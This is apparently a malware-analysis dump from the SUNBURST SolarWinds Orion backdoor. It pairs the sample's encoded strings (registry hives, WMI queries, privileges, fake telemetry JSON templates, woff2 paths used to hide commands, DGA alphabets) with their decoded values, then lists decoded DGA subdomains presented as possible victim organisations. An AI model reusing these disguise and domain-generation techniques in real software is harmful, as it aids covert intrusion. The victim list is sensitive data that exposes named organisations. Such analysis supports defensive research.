Ky3WTU0sLtE1AgA=  ->  us-east-2
M7UwTkm0NDHVNTNKTNM1NEi10DWxNDDSTbRIMzIwTTY3SjJKBQA=  ->  583da945-62af-10e8-4902-a8f205c72b2e
8/B2jYx39nEMDnYNjg/y9w8BAA==  ->  HKEY_CLASSES_ROOT
8/B2DgIA  ->  HKCR
8/B2jYx3Dg0KcvULiQ8Ndg0CAA==  ->  HKEY_CURRENT_USER
8/B2DgUA  ->  HKCU
8/B2jYz38Xd29In3dXT28PRzBQA=  ->  HKEY_LOCAL_MACHINE
8/D28QUA  ->  HKLM
8/B2jYwPDXYNCgYA  ->  HKEY_USERS
8/AOBQA=  ->  HKU
8/B2jYx3Dg0KcvULiXf293PzdAcA  ->  HKEY_CURRENT_CONFIG
8/B2dgYA  ->  HKCC
8/B2jYwPcA1y8/d19HN2jXdxDHEEAA==  ->  HKEY_PERFOMANCE_DATA
8/AOcAEA  ->  HKPD
8/B2jYx3ifSLd3EMcQQA  ->  HKEY_DYN_DATA
8/B2cQEA  ->  HKDD
C9Y11DXVBQA=  ->  S-1-5-
0zU1MAAA  ->  -500
c0zJzczLLC4pSizJLwIA  ->  Administrator
C07NSU0uUdBScCvKz1UIz8wzNooPLU4tckxOzi/NKwEA  ->  Select * From Win32_UserAccount
C/Z0AQA=  ->  SID
88lPTsxxTE7OL80rAQA=  ->  LocalAccount
KykqTQUA  ->  true
C04NSi0uyS9KDSjKLMvMSU1PBQA=  ->  SeRestorePrivilege
C04NScxO9S/PSy0qzsgsCCjKLMvMSU1PBQA=  ->  SeTakeOwnershipPrivilege
C44MDnH1BQA=  ->  SYSTEM
MwEA  ->  4
MwUA  ->  5
MwYA  ->  3
C07NSU0uUdBScCvKz1UIz8wzNooPriwuSc11KcosSy0CAA==  ->  Select * From Win32_SystemDriver
C0gsyfBLzE0FAA==  ->  PathName
C44MDnH1jXEuLSpKzStxzs8rKcrPCU4tiSlOLSrLTE4tBgA=  ->  SYSTEM\CurrentControlSet\services
Cy5JLCoBAA==  ->  Start
Cy5JLCoBAA==  ->  Start
C44MDnH1jXEuLSpKzStxzs8rKcrPCU4tiSlOLSrLTE4tBgA=  ->  SYSTEM\CurrentControlSet\services
Cy5JLCoBAA==  ->  Start
Cy5JLCoBAA==  ->  Start
i6420DGtjVWoNqzlAgA=  ->  [{0,5}] {1}
C07NSU0uUdBScCvKz1UIz8wzNooPKMpPTi0uBgA=  ->  Select * From Win32_Process
c08t8S/PSy0CAA==  ->  GetOwner
i6420DGtjVWoNtTRNTSrVag2quWsNgYKKVSb1MZUm9ZyAQA=  ->  [{0,5}] {1,-16} {2}	{3,5} {4}\{5}
CyjKT04tLvZ0AQA=  ->  ProcessID
80vMTQUA  ->  Name
C0gsSs0rCSjKT04tLvZ0AQA=  ->  ParentProcessID
c0zJzczLLC4pSizJLwIA  ->  Administrator
qzaoVag2rFXwCAkJ0K82quUCAA==  ->  {0} {1} HTTP/{2}
U4qpjjbQtUzUTdONrTY2q42pVapRgooABYxQuIZmtUoA  ->  "\{[0-9a-f-]{36}\}"|"[0-9a-f]{32}"|"[0-9a-f]{16}"
80zT9cvPS9X1TSxJzgAA  ->  If-None-Match
UyotTi3yTFGyUqo2qFXSAQA=  ->  "userId":"{0}",
UypOLS7OzM/zTFGyUqo2qFXSAQA=  ->  "sessionId":"{0}",
UyouSS0oVrKKBgA=  ->  "steps":[
UwrJzE0tLknMLVCyUorRd0ksSdWoNqjVjNFX0gEA  ->  "Timestamp":"\/Date({0})\/",
U/LMS0mtULKqNqjVAQA=  ->  "Index":{0},
U3ItS80rCaksSFWyUvIvyszPU9IBAA==  ->  "EventType":"Orion",
U3ItS80r8UvMTVWyUgKzfRPzEtNTi5R0AA==  ->  "EventName":"EventManager",
U3IpLUosyczP8y1Wsqo2qNUBAA==  ->  "DurationMs":{0},
UwouTU5OTU1JTVGyKikqTdUBAA==  ->  "Succeeded":true,
U/JNLS5OTE9VslKqNqhVAgA=  ->  "Message":"{0}"
SywoyMlMTizJzM/TzyrOzwMA  ->  application/json
SywoyMlMTizJzM/Tz08uSS3RLS4pSk3MBQA=  ->  application/octet-stream
0y3Kzy8BAA==  ->  -root
001OLSoBAA==  ->  -cert
0y3NyyxLLSpOzIlPTgQA  ->  -universal_ca
001OBAA=  ->  -ca
0y0oysxNLKqMT04EAA==  ->  -primary_ca
0y3JzE0tLknMLQAA  ->  -timestamp
003PyU9KzAEA  ->  -global
0y1OTS4tSk1OBAA=  ->  -secureca
K8jO1E8uytGvNqitNqytNqrVA/IA  ->  pki/crl/{0}{1}{2}.crl
c8rPSQEA  ->  Bold
c8rPSfEsSczJTAYA  ->  BoldItalic
c60oKUp0ys9JAQA=  ->  ExtraBold
c60oKUp0ys9J8SxJzMlMBgA=  ->  ExtraBoldItalic
8yxJzMlMBgA=  ->  Italic
88lMzygBAA==  ->  Light
88lMzyjxLEnMyUwGAA==  ->  LightItalic
C0pNL81JLAIA  ->  Regular
C07NzXTKz0kBAA==  ->  SemiBold
C07NzXTKz0nxLEnMyUwGAA==  ->  SemiBoldItalic
yy9IzStOzCsGAA==  ->  opensans
y8svyQcA  ->  noto
SytKTU3LzysBAA==  ->  freefont
C84vLUpOdc5PSQ0oygcA  ->  SourceCodePro
C84vLUpODU4tykwLKMoHAA==  ->  SourceSerifPro
C84vLUpO9UjMC07MKwYA  ->  SourceHanSans
C84vLUpO9UjMC04tykwDAA==  ->  SourceHanSerif
S8vPKynWL89PS9OvNqjVrTYEYqNa3fLUpDSgTLVxrR5IzggA  ->  fonts/woff/{0}-{1}-{2}-webfont{3}.woff2
S8vPKynWL89PS9OvNqjVrTYEYqPaauNaPZCYEQA=  ->  fonts/woff/{0}-{1}-{2}{3}.woff2
C87PSSwKz8xLKQYA  ->  SolarWinds
03POLypJrQjIKU3PzAMA  ->  .CortexPlugin
0/MvyszPAwA=  ->  .Orion
C88sSs1JLS4GAA==  ->  Wireless
C/UEAA==  ->  UI
C89MSU8tKQYA  ->  Widgets
8wvwBQA=  ->  NPM
cyzIz8nJBwA=  ->  Apollo
c87JL03xzc/LLMkvysxLBwA=  ->  CloudMonitoring
88tPSS0GAA==  ->  Nodes
C8vPKc1NLQYA  ->  Volumes
88wrSS1KS0xOLQYA  ->  Interfaces
c87PLcjPS80rKQYA  ->  Components
Ky7PLNAvLUjRBwA=  ->  swip/upd/
06vIzQEA  ->  .xml
Ky7PLNAPLcjJT0zRSyzOqAAA  ->  swip/Upload.ashx
Ky7PLNB3LUvNKykGAA==  ->  swip/Events
881MLsovzk8r0XUuqiwoyXcM8NQHAA==  ->  Microsoft-CryptoAPI/
C87PSSwKz8xLKfYvyszP88wtKMovS81NzStxzskEkvoA  ->  SolarWindsOrionImprovementClient/
i/EvyszP88wtKMovS81NzSuJCc7PSSwKz8xLKdZDl9NLrUgFAA==  ->  \OrionImprovement\SolarWinds.OrionImprovement.exe
M9YzAEJjCyMA  ->  3.0.0.382
Kyo0Ti9OzCkxKzXMrEyryi8wNTdKMbFMyquwSC7LzU4tz8gCAA==  ->  rq3gsalt6u1iyfzop572d49bnx8cvmkewhj
M4jX1QMA  ->  0_-.
K8gwSs1MyzfOMy0tSTfMskixNCksKkvKzTYoTswxN0sGAA==  ->  ph2eifo3n5utg1j8d94qrvbmk0sal76c
MzA0MjYxNTO3sExMSk5JTUvPyMzKzsnNyy8oLCouKS0rr6is0o3XAwA=  ->  0123456789abcdefghijklmnopqrstuvwxyz-_.
0403AAA=  ->  -_0
C04NzigtSckvzwsoyizLzElNTwUA  ->  SeShutdownPrivilege
```



## Possible victims after decrypting dga (Tangled list)
`
['.xsmbiyplzysm5f.gh', '0_y8yejp8-zc2belkin.com', '0i-sfc3tia5g.gncu.local', '-s_kd93hsaeqd2gncu.local', '-ggdpqajkek5yb2gncu.local', '.nw9diizguep8r2ah.org', '.sijf2gajkwmmibits.iastate.ed', '.qgjprojjtk2yk2gncu.local', '0cmy2.owrtck5mi3br', '.lz2sl2ragp90bc4e-internal.c', '-z2jg-mx85yxebamr.corp.intel', '-jkxpjk9w8sh3pbamr.corp.intel', '-ahbazb7e5fakdbseattle.interna', '_5f3rxu5h3euhf2ah.org', '_9q2gd3cg.sw8bwfhf1.hewlett.', '_r7rsbxypzrhxmbad.optimizely.', '.sizyufnr8uf3d2ndl5gotom', '.3begk52rkga3u2aerioncorp.com', '.dtloelhutbd8w2ov', '0uwgdhkzfnee8x2ah.org', '0afra2f5ttecxj2ah.org', '0afra2f5ttecxe2ah.org', '07jtfy85xydh8tbits.iastate.ed', '0a7sssby5lrcxdbad.optimizely.', 'lhi2wcl-iqrnezbglu.com', 'l5qqlfmliffp9dcly9k.in', 'lsc7ke_dtcowmfbgncu.local', 'lzq7dt8ldhqon7ebgncu.local', 'l2rcxs-fmbzsgppits.iastate.ed', 'l2rcxs-fmbzsg3pits.iastate.ed', 'lbs35zoooztmababdotcomm.org', 'lbxjcsprb3eguckbsc.pima.gov', 'ludj.std3hzxsgbbok.com', 'ltk7mbgkky2lrgmpits.iastate.ed', 'l33xrhnm_.2h7pgrupobazar.loca', 'l3w7ae8fdiwoxm8bgncu.local', 'lxb_e9nep85iz7pad.optimizely.', 'lxawxm8sxg3ab-pwfhf1.hewlett.', 'le9mqyigitm3ozpbah.org', 'lnhm0i9iuf3yl3bah.org', 'ln9rdbzapnpk9t0its.iastate.ed', 'lnx0cgnpn5s3bjb.com', 'o.kpehch9qkqlsimesh', 'o9qu3nami5gocuopah.org', 'o9kfr3oc8duec7sphgvc.com', 'o9yxa9f9gap8p5npfa.lcl', 'o9eblxqifbroea7pah.org', 'ob9uu_dzmdk5drpbi.corp', 'obkxmhbo5qqu5gmpcsa.local', 'obn9xd2cmqlwj3ecits.iastate.ed', 'ouo8tlyfea2dem3camr.corp.intel', 'ojfzc.7iqjcaj7cits.iastate.ed', 'okdxdbfggg885onpfa.lcl', 'oketsdyhbkgp_ycits.iastate.ed', 'oiqg9er08towe3pftfcu.corp', 'oipiq7u8kuumzj7pxdxinc.net', 'oirg2bntepwy8q9pgncu.local', 'orlb2aukqam2p.afx7a', 'hhdhxtpbzqssb38uwfhf1.hewlett.', 'h9orrzfnedhue9oue-idsolutions.', 'h9w5p9nm7yhoycuuamr.corp.intel', 'hchmtb.pwayokgkikqk', 'hcqbe9.gje5d3dk59yc', 'hu5gc2hgif2uuqecpaloverde.local', 'huun0kkjngdydycah.org', 'hjjmar8d7dbpokechelixwater.org', 'htj9znhelruilmxuamericas.phoeni', 'htdxwqp7cwlfrkzuits.iastate.ed', 'hkaaftyxbu9ku8fuamr.corp.intel', 'hymak.837s5yuatsjplpcy', 'heh7ggsbui2tm9aufremont.lamrc.', 'hem5y7qgk3cx_ncingo.kg', 'hegc7tx0d_9wycaerioncorp.com', '5z7dijp573jtyqyuglu.com', '59pbjbqt.sonofuah.org', '57q5y5uwbmgpptzo5h2uw.', '52ebn9lx5pg._ubi.corp', '5j3xlxdmqfj8xa8ufa.lcl', '5jdba9rd-iow5euah.org', '5tnieylee7y5l8eutv2.local', '5ksbkm89xbzh2o9ucorp.dvd.com', '5kptbyyu9k9p8qtjits.iastate.ed', '5kptbyyu9k9p8qyjits.iastate.ed', '5ieps3rkmntuwe2jits.iastate.ed', 'fhhswmz_ir5n2.glu.com', 'fssz8henoea2c3gmdetmir-group.r', 'fz2xe8lqrzdn0.calsb.org', 'fqjni2bz.otn87fqsb5uel', 'f2ljc7m2oe3dyyzmits.iastate.ed', 'ftjagnporcq3yayj.com', 'fisoysr9zagtkkjme-idsolutions.', 'fi9s77zzah55ximjglu.com', 'femwayhjlf7enpgjah.org', 'sl.3lzygjwq7tfmcoxnet.cox.com', 'slsnodnet7djap.wfhf1.hewlett.', 'slzrgresdgcy_amions.com', 'slihhhgfha2nhupmgksm.local', 'sliuyhe2rrcqf5ftits.iastate.ed', 'ssqnocsm2l5ndsrmcda.corp', 'ssy-tf9f3tlaepmia.com', 's92uthnsr8wql5ytits.iastate.ed', 'sbopoamqzsb3tzmmglu.com', 'sjf9yrsh5kdokwrmtaylorfarms.com', 'sjb9l78yxf9yxjjmfa.lcl', 'sj859bxlw9g5tm_smes.org', 'skl2qsffide5tb.ebe.co.roanoke', 'skqhkfgmnsnrxe_ah.org', 'sij88dteilf3eemtamr.corp.intel', 'sirzt9nlqm7y.dmrccf.ru', 'sau52qbk.y5rr9f9h-', 'zh57ihayscalzwtkits.iastate.ed', 'zsh793.8tho5fltgncu.local', 'zsh793.8tho5fntgncu.local', 'zssi7tx_fgx-jtbi.corp', 'zb2gqt3kixw3clykneophotonics.co', 'zcpgi7j9j.8x3clc9ji', 'zu_edoflmjqhtjtcsa.local', 'zu_edoflmjqhtttcsa.local', 'zu_edoflmjqht8tcsa.local', 'zu_edoflmjqhtytcsa.local', 'z3lix53kgw.hsdkamr.corp.intel', 'z3a8cf9w3y3dmy.inf.dc.net', 'zxhqdxzkd7hlxbgkint.lukoil-int', 'zebuxooezguwh8ut.il', 'zetqgaxk_e3ergtah.org', 'zeiz5wdynzgolt2tgksm.local', 'znclnxnz823wte3tcasino.prv', 'zncm88il2ul3mudtah.org', '9lkrel5u0enwe28rst.atlantis-p', '9o.s9a9aq3zbygg2swd', '957.5dka7meh8ggabl2', '9f8oqjjokc5ef.ml3jb5xe', '92snusoij5ifsap8its.iastate.ed', '92ulw7ghb5pbyzzkcsa.local', '92aaw8tz7j5k3y-scroot.com', '9uq35eod2txrf0kk.com', '9uwblsetrcwf52a8int.lukoil-int', '9thsaknk5t8alnf8its.iastate.ed', '9t9uqmkgtem8o3dkah.org', '9k.5qnt_l5oxf8amr.corp.intel', '9ks3iyi-5djtfpkinf.dc.net', '9ild39awebctj7j8gloucesterva.ne', '9ipkmtwf3lllood8neophotonics.co', '9es5n5tnjncswutkglu.com', '9enlx7a9bpybtztkcsa.local', '7ssswelhh7akc8u3amr.corp.intel', '7zj2dlxook3cuuh3its.iastate.ed', '72pm8ab5d7xaucf3ad.optimizely.', '7280kxyri2thwu8ah.org', '7bhiab87feooicn3amr.corp.intel', '7ur7ek5dmm9cho38csa.local', '7tfwn.rd77mpna8ecocorp.local', '7t7sbe9iz9pmnzg8.com', '7twltoi2eie372-innout.corp', '73ksxej9hwrkh8t3amr.corp.intel', '7i_t7ru5omnbu83its.iastate.ed', '7ibl5rjb5d0gzl3c4e-internal.c', '7eyogmlljeb2jr-its.iastate.ed', '7gdoxx0nkyrtpwa.uoh8m', '7nzg59fngfg5rx73wfhf1.hewlett.', '7ny-s2jruktmcy8ah.org', 'qlszf9y9sxskertigncu.local', 'qhiuqclj5o2amslifa.lcl', 'qp37.q75pbguk-rzox7l3', 'qcesurliszjnjk.ls92hzf', 'qua2feudiunok90its.iastate.ed', 'qua2feudiunok9uyits.iastate.ed', 'qj2zgbygs22k2a3igncu.local', 'qjjax7tklc8rhzdyamr.corp.intel', 'qjedb.cdhlh377invidia.com', 'qjnhn5wnmm32gtbiamalfi.local', 'qtiykxhl2axfi8gyzippertubing.co', 'qk7sadyqbmyc333iuis.kent.edu', 'qkpx3wh.9isxrtyci.dublin.ca.', 'qkm3k9ru8ktjgeeymilledgeville.l', 'qk3aw7uilmdrcznyamr.corp.intel', 'qihbery8mr7i3otywfhf1.hewlett.', 'qi529tttiilodbeyits.iastate.ed', 'qi5n89xwomnsui0ad.optimizely.', 'qinx9fkibqupp_iah.org', 'qepu2qrlgpuxuxyicsa.local', '2hlhzfniwzley3zygncu.local', '2hlb2o2wp2sunwdwad.library.ucl', '2hz83kaauell7iowits.iastate.ed', '29-a.29dstxpnwad.optimizely.', '2ul59duqlgffdljyfa.lcl', '2u2ds3u-kwj5y8wamr.corp.intel', '2jfxaladz3hawpyyah.org', '2jm9jfor9git7yywad.optimizely.', '2jr52s3zzkg2n9pwits.iastate.ed', '2t9phxp9ygqyxqywamr.corp.intel', '2tu8rsgiuxnlx2hwits.iastate.ed', '2tu8rsgiuxnlx2wwits.iastate.ed', '2temenk9_8xglyysro.vestfor.dk', '2tnbp5xbpniuwc7ya.edu', '2k8kqj8u295gi2sysuperior.local', '239myjwq0znsqeyaerioncorp.com', '23qd-x0jyoddzygyldendal.local', '23wbizkji8iln7pycsa.local', '23wgdmgecd5gpm8ycisco.com', '2i.trm3ec5onayysiskiyous.edu', '2wn2nmj.ylznmka2h-xqf', 'blahdwcaasno5cgwgncu.local', 'b28w99p9dww2we5wftfcu.corp', 'bj8ysw_9jnn.kwthoughtspot.int', 'btmge3dkhsbshm3wnvidia.com', 'btkh5xp5qwg_oneits.iastate.ed', 'bkz7h7mhf8erfncwgncu.local', 'plh9tafwwcmozldrc4e-internal.c', 'plilobgbb7e-ddeaerioncorp.com', 'plr7wqabqb_8xyeta.org', 'p9x9yadqwm7o-nrc4e-internal.c', 'pb27yxe3pnh9u8leftfcu.corp', 'pbpqjswtq9sincneah.org', 'pbcsplu7qz5rw3urits.iastate.ed', 'pjj7j73r9jnwcyjecoxnet.cox.com', 'pk9qihpirs3plljenet.vestfor.dk', 'p32s7ce5e3ftkiqrallegronet.co.', 'pxqd8zjse8ankfjeuis.kent.edu', 'pxp25pt.ew7elsesc.pima.gov', 'pduxwqnt.e55w2yzu0', 'pefmydjtnwo3z87erccf.ru', 'peegqrjanke8i98egncu.local', 'pnf-ebgui23ot9egncu.local', 'pnf-ebgui23otxegncu.local', 'cltfs5z8dhpoufigdetmir-group.r', 'cl8ldcyjix8sn2ergncu.local', 'clwo927qqi2icajgamr.corp.intel', 'chh8mtfwdu23onngits.iastate.ed', 'chy0zqqc8r9yhegtr.technion.ac', 'c9babajogo3d9ylrrs.local', 'c2fu7pp9e3xaqyorbk.local', 'c29scenf9j5mx2jransc.gob.pe', 'c2ykrmb-lhln2rgadmin.callidusc', 'cupns9jhayyrt5jrfa.lcl', 'cumb7fynh5tm83ugits.iastate.ed', 'cux8utdqdhi3in8gits.iastate.ed', 'cjar2ztlncsai73gamr.corp.intel', 'ctajz78wxs7etwlrepl.com', 'cellm8w9ypn7rjzgits.iastate.ed', 'cnulcdwgy7z783lgits.iastate.ed', 'cnulcdwgy7z783ngits.iastate.ed', 'u2f-3ngjw.omlgfa.lcl', 'ubokgndwzehahflaamr.corp.intel', 'ubokgndwzehahffaamr.corp.intel', 'u3me37fzs5u9qedgfa.lcl', 'uih_ecino5gy87gcsa.local', 'unu70ikkugjyfpgah.org', 'jzommk3edahbdq0its.iastate.ed', 'j93nnllmifxarjdaintensive.int', 'jb8-55ydodscoaaah.org', 'jjkw7b9k9d29ag0its.iastate.ed', 'jjx09pd7q2ffuraalm.brand.dk', 'j3amcs3pdg9bag0its.iastate.ed', 'jx7tya0r8uepilnamr.corp.intel', 'jxy3q7j5e3u8xlmnamr.corp.intel', 'jxgw3tzuflgym7_gncu.local', 'jyozrrcrxndy8juuzeb.i8', 'jeftir8jrqze22ynamr.corp.intel', 'jr7bani.xyzrmilnih.if', 'jnoti35xooxnknzabi.corp', 'jnqw8t3lf9qyu73agncu.local', 'mh59xxknkqyqfyunaerioncorp.com', 'mhk77iwo7cqcoa7ncsa.local', 'mhda8pxz939fxh2vadmin.callidusc', 'm572k.2mnbprxpafb97', 'msyfk5fyttyrwhnngncu.local', 'mcowezyo9bnrkbpde9.2pz', 'm3ui2rayx9bf7conak.ru', 'm3jeudmxwb9wcnbnsc.pima.gov', 'm3irezi2i9x39annripta.com', 'mx5gykencc-hrgvsos-ad.state.', 'mxy7rku9d5psywfnfa.lcl', 'mxycf-le7yn27hvint.lukoil-int', 'meqdtyp2kmsgxu9nnvidia.com', 'meb3hnyba2k8ttdvits.iastate.ed', 'meccathlufwtnexnah.org', 'tlbqutiaefaf2d3vcsa.local', 'tlcucnqzg777zodvaerioncorp.com', 'ts5fsi5uycokm25vah.org', 'tzld8q.-53byl4its.iastate.ed', 'tznnzw93niiqcwivscif.com', 't9stcj2eeispmfhvacmedctr.ad', 't273bxojxumf5br4its.iastate.ed', 'tbpwa39o98mulwbvcda.corp', 'tmnyjn7yrnw.uuizzcg', 't8p5_.ts20zit5ekfyoj', 't3_j3pcl_e2mdvfa.lcl', 'tiln7ppyizoe5gs4ccscurriculum.c', 'ty.zcueatzfb3tton-pot', 'tesl3yuh8mj7xae4mnh.rg-law.ac', 'te7crp3dmk7phupvgncu.local', 'tedetd55aczujm7vbi.corp', 'tn8jhpm5jmykfoxvuncity.dk', 'k.u2o0-lz7xjmctgzoxy', 'kh7wefum8788rlb4gncu.local', 'kszhgzo5oec.974nj_3357zllc', 'k9bbgncnxd8e23z6ad.optimizely.', 'k98z3wrya5drcca4ah.org', 'k9anhyesew3j98y6wfhf1.hewlett.', 'kbl9mm9csq8z5ll4csa.local', 'kbl9mm9csq8z5l74csa.local', 'kbupqluy8nepmt54coxnet.cox.com', 'kbtzjx8dqlfk2o34publiser.it', 'kugd.gmz2qzeah6its.iastate.ed', 'kjh3rk7kwj8dznl6its.iastate.ed', 'kjqzbkpyqaqgyir6int.lukoil-int', 'kjeqrpfi5dlw.t6woodruff-sawyer', 'kmwz.m9jqpau7jh0sb', 'ktfyiqpj8gzp2xj6amr.corp.intel', 'kkjow5z2ujzipc0its.iastate.ed', 'kkjow5z2ujzipcl6its.iastate.ed', 'k3f7myw8myqubxp4aerioncorp.com', 'k3kx7shkl82gaa0its.iastate.ed', 'kdfo.roynuhgn9u7cb3yhy', 'kaxg2bj97.o239gchgy', '8z7keft8wbyax831its.iastate.ed', '8zc2f7zfmkq7cqg6.ac.il', '8zkaamjh2g8sh276uont.com', '82f7zaxqadrq3og6vsp.com', '8brwasqxm8z8xxl1ad.optimizely.', '83opqufju3zt3s-its.iastate.ed', '8xst3f5ggtk77mo1its.iastate.ed', '8de58r.2s5zbn2motaf', '8eyehp3.h5z7np6weioffice.com', '8rqihp.5rf882n9wip7njf', '8gxbn39iw.9tkngl2j7x3n', '8nsq-j9z9sdtqy6gncu.local', '8ntjuydakrp3njy1amr.corp.intel', '3.k72hmc9biquiu7ebl', '3luno_sw7xm3ky1aerioncorp.com', '3sw8bh8tmsjj838.ts.iastate.ed', '397ea9dzgwlxsdj1rai.com', '3q2bn3tdxflk2mhl.ak', '3jlnyfqrwpbmssd1aerioncorp.com', '3j7gi8iljdt0e31csa.local', '3jretqdxblh8ojj1glu.com', '3krwexktbao99cj.ts.iastate.ed', '33t_awk8mestrg1ah.org', '33kmo2358ggbgc7.ts.iastate.ed', '3elth58kaq0xsy_mr.corp.intel', '3ehjrqch9hx_wc.ts.iastate.ed', '3exwq33g-xyif31gncu.local', 'xlybwhcxnqwrkxs.sf.cc', 'xh92jtl9ufkizqp0wd.local', 'xhexec7bwp7fz2plits.iastate.ed', 'x9lulf7i5nl2p37.ncu.local', 'x9zrjkkat3l9miklits.iastate.ed', 'x2onhbjkjximqmj_sh.com', 'xufls.skokicp3lad.optimizely.', 'xjnug0a52n22jj.ncu.local', 'xxgzplgyhws9cmn.sa.local', 'xxn37pmwkfn.ep0acr.com', 'xe3u.znqt8jinl.isco.int', 'd_ci977ysz95jeh.yu', 'dl3cuo2g8ff72k8lcsa.local', 'dlyzcwg3h75fzttlaerioncorp.com', 'dscdjl7gwaawzfsocs.haystax.loc', 'dsuezs7rmzl3ryblcoxnet.cox.com', 'dzhwxwaclu5z0llcsci-va.com', 'dz5ckayim8ojexdlfa.lcl', 'dznknmtrcbta2ppoits.iastate.ed', 'd9xqxlsogg9hj0oits.iastate.ed', 'd2-dom8rmxo_8lecobank.group', 'd2fr8yfxmgzydoalagloan.ads', 'd2kodfmggocyaehla.us', 'd28jo8fts.35enoamr.corp.intel', 'd2xfbdstzudju8olgncu.local', 'dbp0apeagqnxswlnv.us', 'dj.cg7lo3aydmllnet.vestfor.dk', 'djuzwb3loako3sulintensive.int', 'dktcc5xh8a77ps7lcsa.local', 'd3haoza5wal9ll7ous.deloitte.co', 'd3w_wl55yuyfglowfhf1.hewlett.', 'dxrtzm5fqta7pfooits.iastate.ed', 'deotq7wuqh572_oits.iastate.ed', 'dedji8djsq332etoamr.corp.intel', 'dark3mt.2aylkxln2l7et3', 'dn8cn3jwcwf2dlflbok.com', 'ihbl9lwssiftttjhci.dublin.ca.', 'ihwceluyp7rdrfxogncu.local', 'ishbcn9i2r5lp-ocsa.local', 'ishbcn9i2r5lp_ocsa.local', 'izbbuuka2_l2fdocsa.local', 'izebsxehngxmybwoapu.mn', 'izeyhiypu3fjm7toglu.com', 'i9pnugnzo8ngjsyhits.iastate.ed', 'i9nxlngilbqaedzoah.org', 'ibgzppfc9jjbwugocorp.ptci.com', 'ij.jz8c9ffp2yyofa.lcl', 'ijsokwxkg9loullosmes.org', 'iju9lmo8bgotpdyhad.optimizely.', 'ijgb3jtgxfq3tsbothoughtspot.int', 'ikedljgj0y3fkrogksm.local', 'iknjsaphqka8-phits.iastate.ed', 'i3gmmtw_y0bwjoaerioncorp.com', 'iiqpob7upf9y5wmhamr.corp.intel', 'ysrq9dplu9.xgchcorp.dvd.com', 'y9rwk9l8nsuh8bshscif.com', 'y2pebn5jwuym5zi5its.iastate.ed', 'y2r3o3fu2-j5pu5amr.corp.intel', 'ybhs7uuwgz2r5el5its.iastate.ed', 'ykq9c5dzcyzornn5c4e-internal.c', 'ykrluha795d_p7haerioncorp.com', 'yg9pl8ilnjeh2.dchjcipu', 'wl0bxye3lpzgn_ncpa.loc', 'wh29mh3x7wzciwqfsos-ad.state.', 'whnbemmbxppmze3fits.iastate.ed', 'w9.jn5ci3ir2ui5gncu.local', 'w9jllgmi2njsps_gncu.local', 'w9jllgmi2njspsz5gncu.local', 'w9nxqct9dhpycatfneophotonics.co', 'w7uoqssz22sysg.rlqhc-', 'w7wzzoq57_8ax.gj.c-', 'wudusq2sao9kc5pfad.optimizely.', 'wudusq2sao9kc5tfad.optimizely.', 'wjbojk7zghriy5tfamr.corp.intel', 'wjpa2eipqlnym5l5repsrv.com', 'wtyigyulktb5jqnfits.iastate.ed', 'wk9odkpnguait5ffamr.corp.intel', 'wi_serytu2358_coxnet.cox.com', 'wekgpkhq3d3bk-5aerioncorp.com', 'wnig5shb3febjfe5aerioncorp.com', 'el5ygj83zwqbabafbmrn.com', 'elwsqemyakbusk2scentral.pima.g', 'efgqf7adlzkw3pttfn.', 'es7dbc8ufsk388esits.iastate.ed', 'es2fbk5hpcikyssfah.org', 'ez52e9e.bc5xsesits.iastate.ed', 'ezfd__fz23sdnsits.iastate.ed', 'ezkf0wgpyskikhfah.org', 'ez8w897hgf3a9oksamr.corp.intel', 'e9rg8rgzlc2wjksscentral.pima.g', 'e2hq9fzio2pljdpfgnb.local', 'eb0zw8mfbi3rdpsits.iastate.ed', 'eb0zw8mfbi3rdesits.iastate.ed', 'ebp99ik-.j2uefroymerlin.com', 'ekcqo3htta2f7p7fcsa.local', 'e8s.r9jqxibfytidtjdoap', 'e3r22bezbsg5nk8sits.iastate.ed', 'exju5thcq0wl3mfsro.vestfor.dk', 'rlhlyut2srowfpnzits.iastate.ed', 'rl2h9cdtwdidnsysfa.lcl', 'rl2n3eyi9g2cc3isernational.uz', 'rszi3uosqnl9zmysnvidia.com', 'rs3.ao5noklrz7saerioncorp.com', 'r99ziat3yw.k5dzwfhf1.hewlett.', 'r93ftir9kyk97efssjhsagov.org', 'ru_95wpag2hohwscisco.com', 'rj3zsdsmce.w8bsbtb.az', 'rjxzyrupypmtdofzwfhf1.hewlett.', 'rtuljier8-0crsxnet.kz', 'rkomocgotn9t5exscoxnet.cox.com', 'rkhztrt8y57tjo8zwfhf1.hewlett.', 'rkr9kgqm7se5x2usah.org', 'r8dl.cwn8se7ismttba', 'rihrz8dh3pu3yr8ssecurview.local', 'ri2afse2md57kq7sfa.lcl', 'rae89kko7jw2m5zfi2.', 'glyaeftdzoertu39amr.corp.intel', 'glaofybm8srxtdw9its.iastate.ed', 'ghc8nl89ixmkwlyzrepsrv.com', 'ghgbxoys7qzibr39wfhf1.hewlett.', 'g7zuipd.rybefrhijxn', 'g2osrub8uluzn5k9admin.callidusc', 'g2tuwwqhq57xyblzcsa.local', 'gco7jre9yoj3.qfnbxninf', 'guz7dozoxmt.ed9woodruff-sawyer', 'gxxzhj5odw9m38j9its.iastate.ed', 'geeo5mm5mzss5qezjarvis.lab', 'gnxrxye7dea27x3zglu.com', 'a-rps9owb.rdshgeqw', 'a.cpk3cw8riekshhec5', 'a0iqhfhx.383bmdnue7np', 'alcxemz7b9h7mc39ch.local', 'ahab3huu9zajm5z9gncu.local', 'afjo.5t-rkoksmjn05n8', 'asthcwbhrr7npb-csa.local', 'az3hucsgr_n2939csa.local', 'a9ys8t-5f0huf9.va.us', 'aucdibaxt52-2n9bi.corp', 'ajem9sr5z9x7gkw7dmv.state.nv.', 'at0zons593e7st7amr.corp.intel', 'atpyqrgkzpu9t7y9nvidia.com', 'atddi0j3g382nt7amr.corp.intel', 'atgdt9awtws.il9bi.corp', 'atgdt9awtws.i79bi.corp', 'ak2esjyixkfy_37its.iastate.ed', 'a3tjqpclopuulgq9deltads.ent', 'ai8do_t3fj85nf7amr.corp.intel', 'nhszl2i8i2e2fgr7corp.sana.com', 'nzzmfd8kphz5ezp7gncu.local', 'n2-sjhysixjh7z7ah.org', 'n27krgh9yglmlajqinternal.hws.o', 'n27a9c3ud2ksd8dqits.iastate.ed', 'n22xfe8gwm99mnbqinternal.hws.o', 'nblmld.pul5pzz7gncu.local', 'nb9p8_9hqlz7tb7.org', 'nua5e3uyxeu8plf7uis.kent.edu', 'nj8maf-whwzzkz7atg.local', 'ntku28zx2add9bdqc4e-internal.c', 'ntdmywgl2ypzqhmqits.iastate.ed', 'ntw.3ojuyigupe7csa.local', 'n3-zhey2derbrsqlasers.state.l', 'nx_r892jpsoh7nqad.optimizely.', 'nemf3dkrjwiommdqad.optimizely.']
`

